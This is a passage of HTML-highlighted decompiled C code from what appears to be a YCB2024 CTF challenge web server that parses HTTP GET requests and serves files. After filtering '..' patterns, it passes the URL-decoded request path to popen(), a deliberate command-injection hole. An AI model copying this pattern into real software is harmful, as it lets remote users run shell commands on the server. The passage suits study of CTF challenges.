  char requestPath<span class="token punctuation">;</span> <span class="token operator">//</span> <span class="token punctuation">[</span>esp<span class="token operator">+</span>56C0h<span class="token punctuation">]</span> <span class="token punctuation">[</span>ebp<span class="token operator">-</span>EA7Ch<span class="token punctuation">]</span> BYREF
  char v37<span class="token punctuation">[</span><span class="token number">9999</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token operator">//</span> <span class="token punctuation">[</span>esp<span class="token operator">+</span>56C1h<span class="token punctuation">]</span> <span class="token punctuation">[</span>ebp<span class="token operator">-</span>EA7Bh<span class="token punctuation">]</span> BYREF
  char httpVersion<span class="token punctuation">[</span><span class="token number">10000</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token operator">//</span> <span class="token punctuation">[</span>esp<span class="token operator">+</span>7DD0h<span class="token punctuation">]</span> <span class="token punctuation">[</span>ebp<span class="token operator">-</span>C36Ch<span class="token punctuation">]</span> BYREF
  char <span class="token builtin">file</span><span class="token punctuation">[</span><span class="token number">20000</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token operator">//</span> <span class="token punctuation">[</span>esp<span class="token operator">+</span>A4E0h<span class="token punctuation">]</span> <span class="token punctuation">[</span>ebp<span class="token operator">-</span>9C5Ch<span class="token punctuation">]</span> BYREF
  char v40<span class="token punctuation">[</span><span class="token number">15588</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token operator">//</span> <span class="token punctuation">[</span>esp<span class="token operator">+</span>F300h<span class="token punctuation">]</span> <span class="token punctuation">[</span>ebp<span class="token operator">-</span>4E3Ch<span class="token punctuation">]</span> BYREF
  __int64 v41<span class="token punctuation">;</span> <span class="token operator">//</span> <span class="token punctuation">[</span>esp<span class="token operator">+</span>12FE4h<span class="token punctuation">]</span> <span class="token punctuation">[</span>ebp<span class="token operator">-</span>1158h<span class="token punctuation">]</span>
  char <span class="token operator">*</span>v42<span class="token punctuation">;</span> <span class="token operator">//</span> <span class="token punctuation">[</span>esp<span class="token operator">+</span>12FECh<span class="token punctuation">]</span> <span class="token punctuation">[</span>ebp<span class="token operator">-</span>1150h<span class="token punctuation">]</span>
  <span class="token builtin">int</span> v43<span class="token punctuation">;</span> <span class="token operator">//</span> <span class="token punctuation">[</span>esp<span class="token operator">+</span>1312Ch<span class="token punctuation">]</span> <span class="token punctuation">[</span>ebp<span class="token operator">-</span>1010h<span class="token punctuation">]</span> BYREF
  unsigned <span class="token builtin">int</span> v44<span class="token punctuation">;</span> <span class="token operator">//</span> <span class="token punctuation">[</span>esp<span class="token operator">+</span>14120h<span class="token punctuation">]</span> <span class="token punctuation">[</span>ebp<span class="token operator">-</span>1Ch<span class="token punctuation">]</span>
  <span class="token builtin">int</span> <span class="token operator">*</span>p_argc<span class="token punctuation">;</span> <span class="token operator">//</span> <span class="token punctuation">[</span>esp<span class="token operator">+</span>1412Ch<span class="token punctuation">]</span> <span class="token punctuation">[</span>ebp<span class="token operator">-</span>10h<span class="token punctuation">]</span>

  p_argc <span class="token operator">=</span> <span class="token operator">&amp;</span>argc<span class="token punctuation">;</span>
  <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token operator">&amp;</span>v43 <span class="token operator">!=</span> <span class="token punctuation">(</span><span class="token builtin">int</span> <span class="token operator">*</span><span class="token punctuation">)</span>v33 <span class="token punctuation">)</span>
    <span class="token punctuation">;</span>
  v44 <span class="token operator">=</span> __readgsdword<span class="token punctuation">(</span>0x14u<span class="token punctuation">)</span><span class="token punctuation">;</span>
  memset<span class="token punctuation">(</span><span class="token operator">&amp;</span>v33<span class="token punctuation">[</span><span class="token number">884</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1024</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  v20 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
  strcpy<span class="token punctuation">(</span>modes<span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> chdir<span class="token punctuation">(</span><span class="token string">"/home/ctf/html"</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token punctuation">)</span>
    puts_error<span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">)</span><span class="token string">"Internal Error"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">"Config error - couldn't chdir()."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> !fgets<span class="token punctuation">(</span>input_data<span class="token punctuation">,</span> <span class="token number">10000</span><span class="token punctuation">,</span> stdin<span class="token punctuation">)</span> <span class="token punctuation">)</span>
    puts_error<span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">)</span><span class="token string">"Bad Request"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">"No request found."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> __isoc99_sscanf<span class="token punctuation">(</span>input_data<span class="token punctuation">,</span> <span class="token string">"%[^ ] %[^ ] %[^ ]"</span><span class="token punctuation">,</span> httpMethod<span class="token punctuation">,</span> <span class="token operator">&amp;</span>requestPath<span class="token punctuation">,</span> httpVersion<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">3</span> <span class="token punctuation">)</span>
    puts_error<span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">)</span><span class="token string">"Bad Request"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">"Can't parse request."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> !fgets<span class="token punctuation">(</span>input_data<span class="token punctuation">,</span> <span class="token number">10000</span><span class="token punctuation">,</span> stdin<span class="token punctuation">)</span> <span class="token punctuation">)</span>
    puts_error<span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">)</span><span class="token string">"Bad Request"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">"Missing Host."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  has_host <span class="token operator">=</span> strstr<span class="token punctuation">(</span>input_data<span class="token punctuation">,</span> <span class="token string">"Host: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> !has_host <span class="token punctuation">)</span>
    puts_error<span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">)</span><span class="token string">"Bad Request"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">"Missing Host."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  v22 <span class="token operator">=</span> strstr<span class="token punctuation">(</span>has_host <span class="token operator">+</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token string">"\r\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> v22 <span class="token punctuation">)</span>
  <span class="token punctuation">&#123;</span>
    <span class="token operator">*</span>v22 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token keyword">else</span>
  <span class="token punctuation">&#123;</span>
    v22 <span class="token operator">=</span> strchr<span class="token punctuation">(</span>has_host <span class="token operator">+</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">)</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span> v22 <span class="token punctuation">)</span>
      <span class="token operator">*</span>v22 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> strlen<span class="token punctuation">(</span>has_host <span class="token operator">+</span> <span class="token number">6</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">7</span> <span class="token punctuation">)</span>
    puts_error<span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">)</span><span class="token string">"Bad Request"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">"Host len error."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> has_host <span class="token operator">==</span> <span class="token punctuation">(</span>char <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">6</span> <span class="token operator">|</span><span class="token operator">|</span> !has_host<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span> <span class="token punctuation">)</span>
    puts_error<span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">)</span><span class="token string">"Bad Request"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">"Host fmt error."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  v42 <span class="token operator">=</span> <span class="token operator">&amp;</span>v17<span class="token punctuation">;</span>
  HIDWORD<span class="token punctuation">(</span>v41<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token operator">&amp;</span>v16<span class="token punctuation">;</span>
  __isoc99_sscanf<span class="token punctuation">(</span>has_host <span class="token operator">+</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token string">"%d.%d.%d.%d%c"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v13<span class="token punctuation">,</span> <span class="token operator">&amp;</span>v14<span class="token punctuation">,</span> <span class="token operator">&amp;</span>v15<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> !fgets<span class="token punctuation">(</span>input_data<span class="token punctuation">,</span> <span class="token number">10000</span><span class="token punctuation">,</span> stdin<span class="token punctuation">)</span> <span class="token punctuation">)</span>
    puts_error<span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">)</span><span class="token string">"Bad Request"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">"Missing Content-Length."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  has_host <span class="token operator">=</span> strstr<span class="token punctuation">(</span>input_data<span class="token punctuation">,</span> <span class="token string">"Content-Length: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> !has_host <span class="token punctuation">)</span>
    puts_error<span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">)</span><span class="token string">"Bad Request"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">"Missing Content-Length."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  v22 <span class="token operator">=</span> strstr<span class="token punctuation">(</span>has_host <span class="token operator">+</span> <span class="token number">16</span><span class="token punctuation">,</span> <span class="token string">"\r\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> v22 <span class="token punctuation">)</span>
  <span class="token punctuation">&#123;</span>
    <span class="token operator">*</span>v22 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token keyword">else</span>
  <span class="token punctuation">&#123;</span>
    v22 <span class="token operator">=</span> strchr<span class="token punctuation">(</span>has_host <span class="token operator">+</span> <span class="token number">16</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">)</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span> v22 <span class="token punctuation">)</span>
      <span class="token operator">*</span>v22 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> strlen<span class="token punctuation">(</span>has_host <span class="token operator">+</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">5</span> <span class="token punctuation">)</span>
    puts_error<span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">)</span><span class="token string">"Bad Request"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">"Content-Length len too long."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> strcasecmp<span class="token punctuation">(</span>httpMethod<span class="token punctuation">,</span> <span class="token string">"get"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>
    puts_error<span class="token punctuation">(</span><span class="token number">501</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">)</span><span class="token string">"Not Implemented"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">"That method is not implemented."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> strncmp<span class="token punctuation">(</span>httpVersion<span class="token punctuation">,</span> <span class="token string">"HTTP/1.0"</span><span class="token punctuation">,</span> 8u<span class="token punctuation">)</span> <span class="token punctuation">)</span>
    puts_error<span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">)</span><span class="token string">"Bad Request"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">"Bad protocol."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> requestPath <span class="token operator">!=</span> <span class="token number">47</span> <span class="token punctuation">)</span>
    puts_error<span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">)</span><span class="token string">"Bad Request"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">"Bad filename."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  haystack <span class="token operator">=</span> v37<span class="token punctuation">;</span>
  urldecode<span class="token punctuation">(</span>v37<span class="token punctuation">,</span> v37<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> !<span class="token operator">*</span>haystack <span class="token punctuation">)</span>
    haystack <span class="token operator">=</span> <span class="token string">"./"</span><span class="token punctuation">;</span>
  v20 <span class="token operator">=</span> strlen<span class="token punctuation">(</span>haystack<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">*</span>haystack <span class="token operator">==</span> <span class="token string">'/'</span>                         <span class="token operator">//</span> 目录穿越检查
    <span class="token operator">|</span><span class="token operator">|</span> !strcmp<span class="token punctuation">(</span>haystack<span class="token punctuation">,</span> <span class="token string">".."</span><span class="token punctuation">)</span>
    <span class="token operator">|</span><span class="token operator">|</span> !strncmp<span class="token punctuation">(</span>haystack<span class="token punctuation">,</span> <span class="token string">"../"</span><span class="token punctuation">,</span> 3u<span class="token punctuation">)</span>
    <span class="token operator">|</span><span class="token operator">|</span> strstr<span class="token punctuation">(</span>haystack<span class="token punctuation">,</span> <span class="token string">"/../"</span><span class="token punctuation">)</span>
    <span class="token operator">|</span><span class="token operator">|</span> !strcmp<span class="token punctuation">(</span><span class="token operator">&amp;</span>haystack<span class="token punctuation">[</span>v20 <span class="token operator">-</span> <span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">"/.."</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>
  <span class="token punctuation">&#123;</span>
    puts_error<span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">)</span><span class="token string">"Bad Request"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">"Illegal filename."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> !sub_1F74<span class="token punctuation">(</span>haystack<span class="token punctuation">)</span> <span class="token punctuation">)</span>
    puts_error<span class="token punctuation">(</span><span class="token number">404</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">)</span><span class="token string">"Not Found"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">"Invalid file name."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  v3 <span class="token operator">=</span> fileno<span class="token punctuation">(</span>stdout<span class="token punctuation">)</span><span class="token punctuation">;</span>
  stdout_fd <span class="token operator">=</span> dup<span class="token punctuation">(</span>v3<span class="token punctuation">)</span><span class="token punctuation">;</span>
  v4 <span class="token operator">=</span> fileno<span class="token punctuation">(</span>stderr<span class="token punctuation">)</span><span class="token punctuation">;</span>
  v24 <span class="token operator">=</span> dup<span class="token punctuation">(</span>v4<span class="token punctuation">)</span><span class="token punctuation">;</span>
  freopen<span class="token punctuation">(</span><span class="token string">"/dev/null"</span><span class="token punctuation">,</span> <span class="token string">"w"</span><span class="token punctuation">,</span> stdout<span class="token punctuation">)</span><span class="token punctuation">;</span>
  freopen<span class="token punctuation">(</span><span class="token string">"/dev/null"</span><span class="token punctuation">,</span> <span class="token string">"w"</span><span class="token punctuation">,</span> stderr<span class="token punctuation">)</span><span class="token punctuation">;</span>
  stream <span class="token operator">=</span> popen<span class="token punctuation">(</span>haystack<span class="token punctuation">,</span> modes<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> stream <span class="token punctuation">)</span>
  <span class="token punctuation">&#123;</span>
    pclose<span class="token punctuation">(</span>stream<span class="token punctuation">)</span><span class="token punctuation">;</span>
    v6 <span class="token operator">=</span> fileno<span class="token punctuation">(</span>stdout<span class="token punctuation">)</span><span class="token punctuation">;</span>
    dup2<span class="token punctuation">(</span>stdout_fd<span class="token punctuation">,</span> v6<span class="token punctuation">)</span><span class="token punctuation">;</span>
    v7 <span class="token operator">=</span> fileno<span class="token punctuation">(</span>stderr<span class="token punctuation">)</span><span class="token punctuation">;</span>
    dup2<span class="token punctuation">(</span>v24<span class="token punctuation">,</span> v7<span class="token punctuation">)</span><span class="token punctuation">;</span>
    close<span class="token punctuation">(</span>stdout_fd<span class="token punctuation">)</span><span class="token punctuation">;</span>
    close<span class="token punctuation">(</span>v24<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span> stat<span class="token punctuation">(</span>haystack<span class="token punctuation">,</span> <span class="token operator">&amp;</span>v29<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token punctuation">)</span>
      puts_error<span class="token punctuation">(</span><span class="token number">404</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">)</span><span class="token string">"Not Found"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">"File not found."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span>v29<span class="token punctuation">.</span>st_mode <span class="token operator">&amp;</span> <span class="token number">0xF000</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0x4000</span> <span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span> haystack<span class="token punctuation">[</span>v20 <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">47</span> <span class="token punctuation">)</span>
      <span class="token punctuation">&#123;</span>
        snprintf<span class="token punctuation">(</span>v40<span class="token punctuation">,</span> 0x4E20u<span class="token punctuation">,</span> <span class="token string">"Location: %s/"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>requestPath<span class="token punctuation">)</span><span class="token punctuation">;</span>
        puts_error<span class="token punctuation">(</span><span class="token number">302</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">)</span><span class="token string">"Found"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">)</span>v40<span class="token punctuation">,</span> <span class="token string">"Directories must end with a slash."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token punctuation">&#125;</span>
      snprintf<span class="token punctuation">(</span><span class="token builtin">file</span><span class="token punctuation">,</span> 0x4E20u<span class="token punctuation">,</span> <span class="token string">"%sindex.html"</span><span class="token punctuation">,</span> haystack<span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span> stat<span class="token punctuation">(</span><span class="token builtin">file</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v29<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token punctuation">)</span>
      <span class="token punctuation">&#123;</span>
        sub_23D9<span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span> <span class="token string">"Ok"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">)</span><span class="token string">"text/html"</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> v29<span class="token punctuation">.</span>st_mtim<span class="token punctuation">.</span>tv_sec<span class="token punctuation">)</span><span class="token punctuation">;</span>
        v26 <span class="token operator">=</span> scandir<span class="token punctuation">(</span>haystack<span class="token punctuation">,</span> <span class="token operator">&amp;</span>namelist<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token builtin">int</span> <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>const void <span class="token operator">*</span><span class="token punctuation">,</span> const void <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>alphasort<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span> v26 <span class="token operator">>=</span> <span class="token number">0</span> <span class="token punctuation">)</span>
        <span class="token punctuation">&#123;</span>
          <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> v26<span class="token punctuation">;</span> <span class="token operator">+</span><span class="token operator">+</span>i <span class="token punctuation">)</span>
          <span class="token punctuation">&#123;</span>
            sub_2704<span class="token punctuation">(</span>v32<span class="token punctuation">,</span> 0x3E8u<span class="token punctuation">,</span> <span class="token punctuation">(</span>unsigned __int8 <span class="token operator">*</span><span class="token punctuation">)</span>namelist<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">-</span><span class="token operator">></span>d_name<span class="token punctuation">)</span><span class="token punctuation">;</span>
            snprintf<span class="token punctuation">(</span><span class="token builtin">file</span><span class="token punctuation">,</span> 0x4E20u<span class="token punctuation">,</span> <span class="token string">"%s/%s"</span><span class="token punctuation">,</span> haystack<span class="token punctuation">,</span> namelist<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">-</span><span class="token operator">></span>d_name<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span> lstat<span class="token punctuation">(</span><span class="token builtin">file</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v29<span class="token punctuation">)</span> <span class="token operator">>=</span> <span class="token number">0</span> <span class="token punctuation">)</span>
            <span class="token punctuation">&#123;</span>
              v8 <span class="token operator">=</span> localtime<span class="token punctuation">(</span><span class="token operator">&amp;</span>v29<span class="token punctuation">.</span>st_mtim<span class="token punctuation">.</span>tv_sec<span class="token punctuation">)</span><span class="token punctuation">;</span>
              strftime<span class="token punctuation">(</span>v31<span class="token punctuation">,</span> 0x10u<span class="token punctuation">,</span> <span class="token string">"%d%b%Y %H:%M"</span><span class="token punctuation">,</span> v8<span class="token punctuation">)</span><span class="token punctuation">;</span>
              printf<span class="token punctuation">(</span><span class="token string">"&lt;a href=\"%s\">%-32.32s&lt;/a>%15s %14lld\n"</span><span class="token punctuation">,</span> v32<span class="token punctuation">,</span> namelist<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">-</span><span class="token operator">></span>d_name<span class="token punctuation">,</span> v31<span class="token punctuation">,</span> <span class="token punctuation">(</span>__int64<span class="token punctuation">)</span>v29<span class="token punctuation">.</span>st_size<span class="token punctuation">)</span><span class="token punctuation">;</span>
              sub_20C6<span class="token punctuation">(</span><span class="token builtin">file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
            <span class="token keyword">else</span>
            <span class="token punctuation">&#123;</span>
              printf<span class="token punctuation">(</span><span class="token string">"&lt;a href=\"%s\">%-32.32s&lt;/a>    ???\n"</span><span class="token punctuation">,</span> v32<span class="token punctuation">,</span> namelist<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">-</span><span class="token operator">></span>d_name<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
            printf<span class="token punctuation">(</span>
              <span class="token string">"&lt;/pre>\n&lt;hr>\n&lt;address>&lt;a href=\"%s\">%s&lt;/a>&lt;/address>\n&lt;/body>&lt;/html>\n"</span><span class="token punctuation">,</span>
              <span class="token string">"https://2024ycb.dasctf.com/"</span><span class="token punctuation">,</span>
              <span class="token string">"YCB2024"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">else</span>
        <span class="token punctuation">&#123;</span>
          perror<span class="token punctuation">(</span><span class="token string">"scandir"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        goto LABEL_74<span class="token punctuation">;</span>
      <span class="token punctuation">&#125;</span>
      haystack <span class="token operator">=</span> <span class="token builtin">file</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    v27 <span class="token operator">=</span> fopen<span class="token punctuation">(</span>haystack<span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span> !v27 <span class="token punctuation">)</span>
      puts_error<span class="token punctuation">(</span><span class="token number">403</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">)</span><span class="token string">"Forbidden"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">"File is protected."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    tv_sec <span class="token operator">=</span> v29<span class="token punctuation">.</span>st_mtim<span class="token punctuation">.</span>tv_sec<span class="token punctuation">;</span>
    st_size <span class="token operator">=</span> v29<span class="token punctuation">.</span>st_size<span class="token punctuation">;</span>
    v11 <span class="token operator">=</span> sub_2566<span class="token punctuation">(</span>haystack<span class="token punctuation">)</span><span class="token punctuation">;</span>
    sub_23D9<span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span> <span class="token string">"Ok"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">)</span>v11<span class="token punctuation">,</span> st_size<span class="token punctuation">,</span> tv_sec<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token number">1</span> <span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
      c <span class="token operator">=</span> getc<span class="token punctuation">(</span>v27<span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span> c <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token punctuation">)</span>
        <span class="token keyword">break</span><span class="token punctuation">;</span>
      putchar<span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
LABEL_74<span class="token punctuation">:</span>
    fflush<span class="token punctuation">(</span>stdout<span class="token punctuation">)</span><span class="token punctuation">;</span>
    exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  result <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> v44 <span class="token operator">!=</span> __readgsdword<span class="token punctuation">(</span>0x14u<span class="token punctuation">)</span> <span class="token punctuation">)</span>
